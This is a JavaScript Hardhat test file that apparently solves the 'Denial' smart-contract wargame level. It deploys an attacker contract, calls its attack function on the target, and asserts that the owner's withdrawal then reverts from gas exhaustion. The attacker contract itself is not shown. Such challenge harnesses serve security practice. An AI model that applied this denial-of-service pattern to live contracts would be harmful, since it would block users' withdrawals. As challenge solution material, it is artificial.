const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Denial", async () => {
    let deployer, attacker, owner
    before(async () => {
        [deployer, attacker] = await ethers.getSigners();
        owner = await ethers.getSigners("0x0000000000000000000000000000000000000A9e")
        const Factory = await ethers.getContractFactory("Denial", owner);
        this.denial = await Factory.deploy();
    })

    it("exploit", async () => {
        const Factory = await ethers.getContractFactory("DenialAttacker", attacker);
        const attackerContract = await Factory.deploy();
        await attackerContract.attack(this.denial.address);
    })

    after(async () => {
        await expect(
            this.denial.withdraw({gasLimit: 100000})
        ).to.be.reverted();
    })
})

